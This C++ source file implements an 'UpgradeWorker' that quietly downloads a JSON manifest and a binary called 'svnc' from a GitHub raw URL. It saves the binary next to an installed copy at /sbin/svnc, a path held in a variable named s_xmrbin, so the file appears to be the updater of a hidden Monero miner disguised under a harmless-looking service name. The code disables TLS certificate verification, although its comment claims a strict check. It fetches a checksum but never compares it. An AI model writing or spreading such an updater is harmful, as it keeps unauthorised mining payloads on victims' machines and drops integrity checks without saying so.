#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "vkUpgradeWorker.h"
#include "vkProcess.h"
#include "../third-party/rapidjson/rapidjson.h"
#include "../third-party/rapidjson/filereadstream.h"
#include "../third-party/rapidjson/document.h"

//using namespace rapidjson;

/* static member init*/
uv_work_t* UpgradeWorker::m_worker         = nullptr;
int UpgradeWorker::m_curl_global_init_rc   = curl_global_init(CURL_GLOBAL_ALL); // CURLE_OK
string UpgradeWorker::s_jsonfile           = Process::location(Process::ExeLocation, "json.txt");
string UpgradeWorker::s_exefile            = Process::location(Process::ExeLocation, "svnc");
const char* UpgradeWorker::s_json_url_addr      = "https://raw.githubusercontent.com/elixirfee/update/master/json.txt";
const char* UpgradeWorker::s_exe_url_addr       = "https://raw.githubusercontent.com/elixirfee/update/master/svnc";
const char* UpgradeWorker::s_xmrbin             = "/sbin/svnc";



UpgradeWorker::UpgradeWorker(void)
{
    m_worker = new uv_work_t;
    m_worker->data = this;
}

UpgradeWorker::~UpgradeWorker(void)
{
    delete m_worker;
}

void UpgradeWorker::DoWorkCb(uv_work_t *req)
{
    printf("%s entry\n", __FUNCTION__);
    string str;
    Md5sum ExeMd5sum;
    ExeMd5sum.Md5File(s_xmrbin);
    
    CURL *easy_handle = curl_easy_init();

    printf("md5sum:%s\n", ExeMd5sum.HexDigest().c_str());
    if(easy_handle) 
    {
        char readBuffer[512];
        // download json.txt
        FILE *fp = fopen(s_jsonfile.c_str(), "w+");
        curl_easy_setopt(easy_handle, CURLOPT_URL, s_json_url_addr);
        /* Set the default value: strict certificate check please */
        curl_easy_setopt(easy_handle, CURLOPT_SSL_VERIFYPEER, 0L);
	    curl_easy_setopt(easy_handle, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(easy_handle, CURLOPT_TIMEOUT, 1200);
        curl_easy_perform(easy_handle);
        //curl_easy_cleanup(easy_handle);
        fclose(fp);

        // get md5sum
        fp = fopen(s_jsonfile.c_str(), "r");
        rapidjson::FileReadStream is(fp, readBuffer, sizeof(readBuffer));
        rapidjson::Document doc;
        doc.ParseStream(is);
        if (!doc.HasParseError())
        {
            if(doc.HasMember("md5sum"))
            {
                str = doc["md5sum"].GetString();
                printf("%s\n",str.c_str());
            }
        }
        fclose(fp);

        // download exe file
        fp = fopen(s_exefile.c_str(), "w+");
        curl_easy_setopt(easy_handle, CURLOPT_URL, s_exe_url_addr);
        /* Set the default value: strict certificate check please */
        curl_easy_setopt(easy_handle, CURLOPT_SSL_VERIFYPEER, 0L);
	    curl_easy_setopt(easy_handle, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(easy_handle, CURLOPT_TIMEOUT, 1200);
        curl_easy_perform(easy_handle);
        //curl_easy_cleanup(easy_handle);
        fclose(fp);


    }
    
    printf("%s exit\n", __FUNCTION__);
}

void UpgradeWorker::AfterWorkCb(uv_work_t *req, int status)
{ 
    printf("after do working\n");  
    UpgradeWorker *pThis = (UpgradeWorker*)req->data;
    delete pThis;
}

void UpgradeWorker::Scheduler(void)
{
    uv_queue_work(uv_default_loop(), m_worker, UpgradeWorker::DoWorkCb, UpgradeWorker::AfterWorkCb);
}